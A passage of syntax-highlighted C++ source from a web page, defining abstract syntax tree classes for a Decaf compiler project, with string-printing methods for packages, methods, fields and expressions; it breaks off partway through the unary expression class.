class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br></pre></td><td class="code"><pre><code class="hljs c++"><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;default-defs.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;list&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;ostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sstream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifndef</span> YYTOKENTYPE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;decafast.tab.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><br><span class="hljs-comment">/// decafAST - Base class for all abstract syntax tree nodes.</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">decafAST</span> &#123;</span><br><span class="hljs-keyword">public</span>:<br>  <span class="hljs-keyword">virtual</span> ~decafAST() &#123;&#125;<br>  <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-built_in">string</span> <span class="hljs-title">str</span><span class="hljs-params">()</span> </span>&#123; <span class="hljs-keyword">return</span> <span class="hljs-built_in">string</span>(<span class="hljs-string">&quot;&quot;</span>); &#125;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-built_in">string</span> <span class="hljs-title">getString</span><span class="hljs-params">(decafAST *d)</span> </span>&#123;<br><span class="hljs-keyword">if</span> (d != <span class="hljs-literal">NULL</span>) &#123;<br><span class="hljs-keyword">return</span> d-&gt;str();<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">string</span>(<span class="hljs-string">&quot;None&quot;</span>);<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">template</span> &lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>&gt;</span><br><span class="hljs-function"><span class="hljs-built_in">string</span> <span class="hljs-title">commaList</span><span class="hljs-params">(<span class="hljs-built_in">list</span>&lt;T&gt; vec)</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-built_in">string</span> <span class="hljs-title">s</span><span class="hljs-params">(<span class="hljs-string">&quot;&quot;</span>)</span></span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">typename</span> <span class="hljs-built_in">list</span>&lt;T&gt;::iterator i = vec.begin(); i != vec.end(); i++) &#123; <br>        s = s + (s.empty() ? <span class="hljs-built_in">string</span>(<span class="hljs-string">&quot;&quot;</span>) : <span class="hljs-built_in">string</span>(<span class="hljs-string">&quot;,&quot;</span>)) + (*i)-&gt;str(); <br>    &#125;   <br>    <span class="hljs-keyword">if</span> (s.empty()) &#123;<br>        s = <span class="hljs-built_in">string</span>(<span class="hljs-string">&quot;None&quot;</span>);<br>    &#125;   <br>    <span class="hljs-keyword">return</span> s;<br>&#125;<br><br><span class="hljs-comment">/// decafStmtList - List of Decaf statements</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">decafStmtList</span> :</span> <span class="hljs-keyword">public</span> decafAST &#123;<br><span class="hljs-built_in">list</span>&lt;decafAST *&gt; stmts;<br><span class="hljs-keyword">public</span>:<br>decafStmtList() &#123;&#125;<br>~decafStmtList() &#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-built_in">list</span>&lt;decafAST *&gt;::iterator i = stmts.begin(); i != stmts.end(); i++) &#123; <br><span class="hljs-keyword">delete</span> *i;<br>&#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">size</span><span class="hljs-params">()</span> </span>&#123; <span class="hljs-keyword">return</span> stmts.size(); &#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">push_front</span><span class="hljs-params">(decafAST *e)</span> </span>&#123; stmts.push_front(e); &#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">push_back</span><span class="hljs-params">(decafAST *e)</span> </span>&#123; stmts.push_back(e); &#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">move_to</span><span class="hljs-params">(decafStmtList * target)</span></span>&#123;<br>assert( target != <span class="hljs-literal">NULL</span> );<br><span class="hljs-keyword">for</span>( <span class="hljs-built_in">list</span>&lt;decafAST *&gt;::iterator i = stmts.begin(); i != stmts.end(); i++) &#123;<br>target-&gt;push_back( *i );<br>&#125;<br>stmts.clear();<br>&#125;<br><span class="hljs-function"><span class="hljs-built_in">string</span> <span class="hljs-title">str</span><span class="hljs-params">()</span> </span>&#123; <span class="hljs-keyword">return</span> commaList&lt;class decafAST *&gt;(stmts); &#125;<br>&#125;;<br><br><span class="hljs-comment">// package = Package(identifier name, field_decl* field_list, method_decl* method_list)</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PackageAST</span> :</span> <span class="hljs-keyword">public</span> decafAST &#123;<br><span class="hljs-built_in">string</span> Name;<br>decafStmtList *FieldDeclList;<br>decafStmtList *MethodDeclList;<br><span class="hljs-keyword">public</span>:<br>PackageAST(<span class="hljs-built_in">string</span> name, decafStmtList *fieldlist, decafStmtList *methodlist) <br>: Name(name), FieldDeclList(fieldlist), MethodDeclList(methodlist) &#123;&#125;<br>~PackageAST() &#123; <br><span class="hljs-keyword">if</span> (FieldDeclList != <span class="hljs-literal">NULL</span>) &#123; <span class="hljs-keyword">delete</span> FieldDeclList; &#125;<br><span class="hljs-keyword">if</span> (MethodDeclList != <span class="hljs-literal">NULL</span>) &#123; <span class="hljs-keyword">delete</span> MethodDeclList; &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-built_in">string</span> <span class="hljs-title">str</span><span class="hljs-params">()</span> </span>&#123; <br><span class="hljs-keyword">return</span> <span class="hljs-built_in">string</span>(<span class="hljs-string">&quot;Package&quot;</span>) + <span class="hljs-string">&quot;(&quot;</span> + Name + <span class="hljs-string">&quot;,&quot;</span> + getString(FieldDeclList) + <span class="hljs-string">&quot;,&quot;</span> + getString(MethodDeclList) + <span class="hljs-string">&quot;)&quot;</span>;<br>&#125;<br>&#125;;<br><br><span class="hljs-comment">/// ProgramAST - the decaf program</span><br><span class="hljs-comment">// prog = Program(extern* extern_list, package body)</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ProgramAST</span> :</span> <span class="hljs-keyword">public</span> decafAST &#123;<br>decafStmtList *ExternList;<br>PackageAST *PackageDef;<br><span class="hljs-keyword">public</span>:<br>ProgramAST(decafStmtList *externs, PackageAST *c) : ExternList(externs), PackageDef(c) &#123;&#125;<br>~ProgramAST() &#123; <br><span class="hljs-keyword">if</span> (ExternList != <span class="hljs-literal">NULL</span>) &#123; <span class="hljs-keyword">delete</span> ExternList; &#125; <br><span class="hljs-keyword">if</span> (PackageDef != <span class="hljs-literal">NULL</span>) &#123; <span class="hljs-keyword">delete</span> PackageDef; &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-built_in">string</span> <span class="hljs-title">str</span><span class="hljs-params">()</span> </span>&#123; <span class="hljs-keyword">return</span> <span class="hljs-built_in">string</span>(<span class="hljs-string">&quot;Program&quot;</span>) + <span class="hljs-string">&quot;(&quot;</span> + getString(ExternList) + <span class="hljs-string">&quot;,&quot;</span> + getString(PackageDef) + <span class="hljs-string">&quot;)&quot;</span>; &#125;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TypeAST</span> :</span> <span class="hljs-keyword">public</span> decafAST &#123;<br><span class="hljs-built_in">string</span> * Name;<br><br><span class="hljs-keyword">public</span>:<br>TypeAST(<span class="hljs-built_in">string</span> * name): Name(name) &#123;&#125;;<br>~TypeAST() &#123; <span class="hljs-keyword">if</span>(Name) <span class="hljs-keyword">delete</span> Name; &#125;;<br><span class="hljs-function"><span class="hljs-built_in">string</span> <span class="hljs-title">str</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">string</span>(*Name);<br>&#125;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">VarDefAST</span> :</span> <span class="hljs-keyword">public</span> decafAST &#123;<br><span class="hljs-built_in">string</span> Name;<br>decafStmtList * TypeList;<br><br><span class="hljs-keyword">public</span>:<br>VarDefAST(decafStmtList * typelist): TypeList(typelist) &#123;&#125;<br>VarDefAST(<span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> name, TypeAST * type ) &#123;<br>decafStmtList * typelist = <span class="hljs-keyword">new</span> decafStmtList();<br>typelist-&gt;push_back(type);<br>TypeList = typelist;<br>Name = name;<br>&#125;;<br><br>~VarDefAST() &#123;<br><span class="hljs-keyword">if</span>( TypeList ) <span class="hljs-keyword">delete</span> TypeList;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-built_in">string</span> <span class="hljs-title">str</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-keyword">if</span> (TypeList-&gt;size() == <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">string</span>(<span class="hljs-string">&quot;None&quot;</span>);<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(TypeList-&gt;size() == <span class="hljs-number">1</span> &amp;&amp; Name != <span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">string</span>(<span class="hljs-string">&quot;VarDef(&quot;</span>) + Name + <span class="hljs-string">&quot;,&quot;</span> + getString(TypeList) + <span class="hljs-string">&quot;)&quot;</span>;<br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">return</span> <span class="hljs-built_in">string</span>(<span class="hljs-string">&quot;VarDef(&quot;</span>) + getString(TypeList) + <span class="hljs-string">&quot;)&quot;</span>;<br>&#125;<br>&#125;;<br><br><br><br><br><span class="hljs-comment">// ExternFunction(identifier name, method_type return_type, extern_type* typelist)</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ExternFunctionAST</span> :</span> <span class="hljs-keyword">public</span> decafAST &#123;<br><span class="hljs-built_in">string</span> Name;<br>TypeAST * ReturnType;<br>VarDefAST * VarList;<br><br><span class="hljs-keyword">public</span>:<br>ExternFunctionAST(<span class="hljs-built_in">string</span> name, TypeAST * returntype, VarDefAST * varlist): Name(name), ReturnType(returntype), VarList(varlist) &#123;&#125;<br>~ExternFunctionAST() &#123;<br><span class="hljs-keyword">if</span>( VarList ) <span class="hljs-keyword">delete</span> VarList;<br><span class="hljs-keyword">if</span>( ReturnType ) <span class="hljs-keyword">delete</span> ReturnType;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-built_in">string</span> <span class="hljs-title">str</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">string</span>(<span class="hljs-string">&quot;ExternFunction&quot;</span>)  + <span class="hljs-string">&quot;(&quot;</span> + Name + <span class="hljs-string">&quot;,&quot;</span> + ReturnType-&gt;str() + <span class="hljs-string">&quot;,&quot;</span> + getString(VarList) + <span class="hljs-string">&quot;)&quot;</span>;<br>&#125;<br>&#125;;<br><br><span class="hljs-comment">// field_size = Scalar | Array(int array_size)</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">VAR_TYPE</span> &#123;</span> VAR_TYPE_SCALAR, VAR_TYPE_ARRAY &#125;;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">VarSizeAST</span> :</span> <span class="hljs-keyword">public</span> decafAST &#123;<br><span class="hljs-keyword">private</span>:<br>VAR_TYPE VarType;<br><span class="hljs-built_in">string</span> Size;<br><span class="hljs-keyword">public</span>:<br>VarSizeAST(VAR_TYPE type, <span class="hljs-built_in">string</span> size): VarType(type), Size(size) &#123;&#125;;<br><br><span class="hljs-function"><span class="hljs-built_in">string</span> <span class="hljs-title">str</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">if</span>( VarType == VAR_TYPE_SCALAR)<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">string</span>(<span class="hljs-string">&quot;Scalar&quot;</span>);<br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">return</span> <span class="hljs-built_in">string</span>(<span class="hljs-string">&quot;Array(&quot;</span>) + Size + <span class="hljs-string">&quot;)&quot;</span>;<br>&#125; <br>&#125;;<br><br><span class="hljs-comment">// FieldDecl(identifier name, decaf_type type, field_size size)</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FieldDeclAST</span> :</span> <span class="hljs-keyword">public</span> decafAST &#123;<br><span class="hljs-built_in">string</span> Name;<br>TypeAST * Type;<br>VarSizeAST * field_size;<br><br><span class="hljs-keyword">public</span>:<br>FieldDeclAST(<span class="hljs-built_in">string</span> name, TypeAST * type, VarSizeAST * size): Name(name), Type(type), field_size(size) &#123; &#125;;<br>~FieldDeclAST() &#123; <span class="hljs-keyword">if</span> (Type) <span class="hljs-keyword">delete</span> Type; <span class="hljs-keyword">if</span>(field_size) <span class="hljs-keyword">delete</span> field_size;&#125;;<br><br><span class="hljs-function"><span class="hljs-built_in">string</span> <span class="hljs-title">str</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">string</span>(<span class="hljs-string">&quot;FieldDecl(&quot;</span>) + Name + <span class="hljs-string">&quot;,&quot;</span> + getString(Type) + <span class="hljs-string">&quot;,&quot;</span> + getString(field_size) + <span class="hljs-string">&quot;)&quot;</span>;  <br>&#125;<br><br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">StringConstantAST</span>:</span> <span class="hljs-keyword">public</span> decafAST &#123;<br><span class="hljs-built_in">string</span> Value;<br><span class="hljs-keyword">public</span>:<br>StringConstantAST(<span class="hljs-built_in">string</span> v): Value(v) &#123;&#125;;<br>~StringConstantAST() &#123;&#125;;<br><br><span class="hljs-function"><span class="hljs-built_in">string</span> <span class="hljs-title">str</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">string</span>(<span class="hljs-string">&quot;StringConstant(&quot;</span>) + Value + <span class="hljs-string">&quot;)&quot;</span>;<br>&#125;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ValueExpr</span> :</span> <span class="hljs-keyword">public</span> decafAST &#123;&#125;;<br><br><span class="hljs-comment">// NumberExpr(int value)</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NumberExpr</span> :</span> <span class="hljs-keyword">public</span> ValueExpr &#123;<br><span class="hljs-built_in">string</span> Value;<br><br><span class="hljs-keyword">public</span>:<br>NumberExpr(<span class="hljs-built_in">string</span> value): Value(value) &#123; &#125;;<br>~NumberExpr() &#123;&#125;;<br><span class="hljs-function"><span class="hljs-built_in">string</span> <span class="hljs-title">str</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">string</span>(<span class="hljs-string">&quot;NumberExpr(&quot;</span>) + Value + <span class="hljs-string">&quot;)&quot;</span>;<br>&#125;<br>&#125;;<br><br><span class="hljs-comment">// BoolExpr(bool value)</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BoolExpr</span> :</span> <span class="hljs-keyword">public</span> ValueExpr &#123;<br><span class="hljs-keyword">bool</span> Value;<br><br><span class="hljs-keyword">public</span>:<br>BoolExpr(<span class="hljs-keyword">bool</span> value): Value(value) &#123;&#125;;<br>~BoolExpr() &#123;&#125;;<br><br><span class="hljs-function"><span class="hljs-built_in">string</span> <span class="hljs-title">str</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">string</span>(<span class="hljs-string">&quot;BoolExpr(&quot;</span>) + ( Value ? <span class="hljs-string">&quot;True&quot;</span>:<span class="hljs-string">&quot;False&quot;</span> ) + <span class="hljs-string">&quot;)&quot;</span>;<br>&#125;<br>&#125;;<br><br><br><span class="hljs-comment">// AssignGlobalVar(identifier name, decaf_type type, constant value)</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AssignGlobalVar</span> :</span> <span class="hljs-keyword">public</span> decafAST &#123;<br><span class="hljs-built_in">string</span> Name;<br>TypeAST * Type;<br>ValueExpr * Value;<br><br><span class="hljs-keyword">public</span>:<br>AssignGlobalVar(<span class="hljs-built_in">string</span> name, TypeAST * type,ValueExpr * value): Name(name), Type(type), Value(value) &#123;&#125; ;<br>~AssignGlobalVar() &#123;<br><span class="hljs-keyword">if</span> ( Type ) <span class="hljs-keyword">delete</span> Type;<br><span class="hljs-keyword">if</span> ( Value ) <span class="hljs-keyword">delete</span> Value;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-built_in">string</span> <span class="hljs-title">str</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">string</span>(<span class="hljs-string">&quot;AssignGlobalVar(&quot;</span>) + Name + <span class="hljs-string">&quot;,&quot;</span> + getString(Type) + <span class="hljs-string">&quot;,&quot;</span> + getString(Value) + <span class="hljs-string">&quot;)&quot;</span>;<br>&#125;<br>&#125;;<br><br><span class="hljs-comment">// MethodBlock(typed_symbol* var_decl_list, statement* statement_list)</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MethodBlockAST</span>:</span> <span class="hljs-keyword">public</span> decafAST &#123;<br>decafStmtList * VarDeclList;<br>decafStmtList * StatementList;<br><br><span class="hljs-keyword">public</span>:<br>MethodBlockAST(decafStmtList* var_decl_list, decafStmtList * statement_list): VarDeclList(var_decl_list), StatementList(statement_list) &#123;&#125;<br>~MethodBlockAST()&#123;<br><span class="hljs-keyword">if</span>( VarDeclList ) <span class="hljs-keyword">delete</span> VarDeclList;<br><span class="hljs-keyword">if</span>( StatementList ) <span class="hljs-keyword">delete</span> StatementList;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-built_in">string</span> <span class="hljs-title">str</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">string</span>(<span class="hljs-string">&quot;MethodBlock(&quot;</span>) + getString(VarDeclList)+<span class="hljs-string">&quot;,&quot;</span> + getString(StatementList) + <span class="hljs-string">&quot;)&quot;</span>;<br>&#125;<br>&#125;;<br><br><span class="hljs-comment">// Block(typed_symbol* var_decl_list, statement* statement_list)</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BlockAST</span>:</span> <span class="hljs-keyword">public</span> decafAST &#123;<br>decafStmtList * VarDeclList;<br>decafStmtList * StatementList;<br><br><span class="hljs-keyword">public</span>:<br>BlockAST(decafStmtList* var_decl_list, decafStmtList * statement_list): VarDeclList(var_decl_list), StatementList(statement_list) &#123;&#125;<br>~BlockAST()&#123;<br><span class="hljs-keyword">if</span>( VarDeclList ) <span class="hljs-keyword">delete</span> VarDeclList;<br><span class="hljs-keyword">if</span>( StatementList ) <span class="hljs-keyword">delete</span> StatementList;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-built_in">string</span> <span class="hljs-title">str</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">string</span>(<span class="hljs-string">&quot;Block(&quot;</span>) + getString(VarDeclList)+<span class="hljs-string">&quot;,&quot;</span> + getString(StatementList) + <span class="hljs-string">&quot;)&quot;</span>;<br>&#125;<br>&#125;;<br><br><span class="hljs-comment">// Method(identifier name, method_type return_type, typed_symbol* param_list, method_block block)</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MethodAST</span> :</span> <span class="hljs-keyword">public</span> decafAST &#123;<br><span class="hljs-built_in">string</span> Name;<br>TypeAST *  ReturnType;<br>decafStmtList * ParamList; <span class="hljs-comment">// VarDefAST*</span><br>MethodBlockAST * Block;<br><br><span class="hljs-keyword">public</span>:<br>MethodAST(<span class="hljs-built_in">string</span> name, TypeAST * return_type, decafStmtList * param_list, MethodBlockAST * block): <br>Name(name), ReturnType(return_type), ParamList(param_list), Block(block) &#123;&#125;;<br><br>~MethodAST()&#123;<br><span class="hljs-keyword">if</span>( ReturnType ) <span class="hljs-keyword">delete</span> ReturnType;<br><span class="hljs-keyword">if</span>( ParamList ) <span class="hljs-keyword">delete</span> ParamList;<br><span class="hljs-keyword">if</span>( Block ) <span class="hljs-keyword">delete</span> Block;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-built_in">string</span> <span class="hljs-title">str</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">string</span>(<span class="hljs-string">&quot;Method(&quot;</span>) + Name + <span class="hljs-string">&quot;,&quot;</span> + getString(ReturnType) + <span class="hljs-string">&quot;,&quot;</span> + getString(ParamList) + <span class="hljs-string">&quot;,&quot;</span> + getString(Block) + <span class="hljs-string">&quot;)&quot;</span>;<br>&#125;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ExprAST</span>:</span> <span class="hljs-keyword">public</span> decafAST &#123;&#125;;<br><br><span class="hljs-comment">// AssignArrayLoc(identifier name, expr index, expr value)</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AssignArrayLocAST</span> :</span> <span class="hljs-keyword">public</span> decafAST &#123;<br><span class="hljs-built_in">string</span> Name;<br>ExprAST * IndexExpr;<br>ExprAST * ValueExpr;<br><br><span class="hljs-keyword">public</span>:<br>AssignArrayLocAST(<span class="hljs-built_in">string</span> name, ExprAST * index, ExprAST * value): Name(name), IndexExpr(index), ValueExpr(value) &#123;&#125;;<br>~AssignArrayLocAST() &#123;<br><span class="hljs-keyword">if</span> ( IndexExpr ) <span class="hljs-keyword">delete</span> IndexExpr;<br><span class="hljs-keyword">if</span> ( ValueExpr ) <span class="hljs-keyword">delete</span> ValueExpr;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-built_in">string</span> <span class="hljs-title">str</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">string</span>(<span class="hljs-string">&quot;AssignArrayLoc(&quot;</span>) + Name + <span class="hljs-string">&quot;,&quot;</span> + getString(IndexExpr) + <span class="hljs-string">&quot;,&quot;</span> + getString(ValueExpr) + <span class="hljs-string">&quot;)&quot;</span>;<br>&#125;<br>&#125;;<br><br><span class="hljs-comment">// AssignVar(identifier name, expr value)</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AssignVarAST</span>:</span> <span class="hljs-keyword">public</span> decafAST &#123;<br><span class="hljs-built_in">string</span> Name;<br>ExprAST * Expr;<br><br><span class="hljs-keyword">public</span>:<br>AssignVarAST(<span class="hljs-built_in">string</span> name, ExprAST * expr): Name(name), Expr(expr) &#123;&#125;;<br>~AssignVarAST() &#123;<br><span class="hljs-keyword">if</span>( Expr ) <span class="hljs-keyword">delete</span> Expr;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-built_in">string</span> <span class="hljs-title">str</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">string</span>(<span class="hljs-string">&quot;AssignVar(&quot;</span>) + Name + <span class="hljs-string">&quot;,&quot;</span> + getString(Expr) + <span class="hljs-string">&quot;)&quot;</span>;<br>&#125;<br>&#125;;<br><br><span class="hljs-comment">// rvalue = VariableExpr(identifier name)</span><br><span class="hljs-comment">//     | ArrayLocExpr(identifier name, expr index)</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">VariableExprAST</span>:</span> <span class="hljs-keyword">public</span> decafAST &#123;<br><span class="hljs-built_in">string</span> Id;<br><span class="hljs-keyword">public</span>:<br>VariableExprAST(<span class="hljs-built_in">string</span> id): Id(id) &#123;&#125;;<br>~VariableExprAST() &#123;&#125;;<br><br><span class="hljs-function"><span class="hljs-built_in">string</span> <span class="hljs-title">str</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">string</span>(<span class="hljs-string">&quot;VariableExpr(&quot;</span>) + Id + <span class="hljs-string">&quot;)&quot;</span>;<br>&#125;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ArrayLocExprAST</span>:</span> <span class="hljs-keyword">public</span> decafAST &#123;<br><span class="hljs-built_in">string</span> Id;<br>ExprAST * IndexExpr;<br><br><span class="hljs-keyword">public</span>:<br>ArrayLocExprAST(<span class="hljs-built_in">string</span> id, ExprAST * expr): Id(id), IndexExpr(expr) &#123;&#125;;<br>~ArrayLocExprAST() &#123;<br><span class="hljs-keyword">if</span>( IndexExpr ) <span class="hljs-keyword">delete</span> IndexExpr;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-built_in">string</span> <span class="hljs-title">str</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">string</span>(<span class="hljs-string">&quot;ArrayLocExpr(&quot;</span>) + Id + <span class="hljs-string">&quot;,&quot;</span> + getString(IndexExpr) + <span class="hljs-string">&quot;)&quot;</span>;<br>&#125;<br><br>&#125;;<br><br><span class="hljs-comment">// MethodCall(identifier name, method_arg* method_arg_list)</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MethodCallAST</span>:</span> <span class="hljs-keyword">public</span> decafAST &#123;<br><span class="hljs-built_in">string</span> Name;<br>decafStmtList * MethodArgList;<br><span class="hljs-keyword">public</span>:<br>MethodCallAST(<span class="hljs-built_in">string</span> name, decafStmtList * method_arg_list): Name(name), MethodArgList(method_arg_list) &#123;&#125;;<br>~MethodCallAST() &#123;<br><span class="hljs-keyword">if</span> ( MethodArgList ) <span class="hljs-keyword">delete</span> MethodArgList;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-built_in">string</span> <span class="hljs-title">str</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">string</span>(<span class="hljs-string">&quot;MethodCall(&quot;</span>) + Name + <span class="hljs-string">&quot;,&quot;</span> + getString(MethodArgList) + <span class="hljs-string">&quot;)&quot;</span>;<br>&#125;<br>&#125;;<br><br><span class="hljs-comment">// BinaryExpr(binary_operator op, expr left_value, expr right_value)</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BinaryExprAST</span>:</span> <span class="hljs-keyword">public</span> decafAST &#123;<br><span class="hljs-built_in">string</span> Op; <span class="hljs-comment">// &#123;Plus , Minus , Mult , Div , Leftshift , Rightshift , Mod , Lt , Gt , Leq , Geq , Eq , Neq , And , Or&#125;;</span><br>ExprAST * LeftExpr;<br>ExprAST * RightExpr;<br><br><span class="hljs-keyword">public</span>:<br>BinaryExprAST(<span class="hljs-built_in">string</span> op, ExprAST * left, ExprAST * right): Op(op), LeftExpr(left), RightExpr(right) &#123;&#125;;<br>~BinaryExprAST() &#123;<br><span class="hljs-keyword">if</span> ( LeftExpr ) <span class="hljs-keyword">delete</span> LeftExpr;<br><span class="hljs-keyword">if</span> ( RightExpr ) <span class="hljs-keyword">delete</span> RightExpr;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-built_in">string</span> <span class="hljs-title">str</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">string</span>(<span class="hljs-string">&quot;BinaryExpr(&quot;</span>) + Op + <span class="hljs-string">&quot;,&quot;</span> + getString(LeftExpr) + <span class="hljs-string">&quot;,&quot;</span> + getString(RightExpr) + <span class="hljs-string">&quot;)&quot;</span>;<br>&#125;<br><br>&#125;;<br><br><span class="hljs-comment">// UnaryExpr(unary_operator op, expr value)</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UnaryExprAST</span>:</span> <span class="hljs-keyword">public</span> decafAST &#123;<br><span class="hljs-built_in">string</span> Op; <span class="hljs-comment">// UnaryMinus | Not</span><br>ExprAST * Expr;<br><br><span class="hljs-keyword">public</span>:<br>UnaryExprAST(<span class="hljs-built_in">string</span> op, ExprAST * expr): Op(op), Expr(expr) &#123;&#125;;<br>~UnaryExprAST() &#123;<br><span class="hljs-keyword">if</span> ( Expr ) <span class="hljs-keyword">delete</span> Expr;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-built_in">string</span> <span class="hljs-title">str</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">return</span> <span 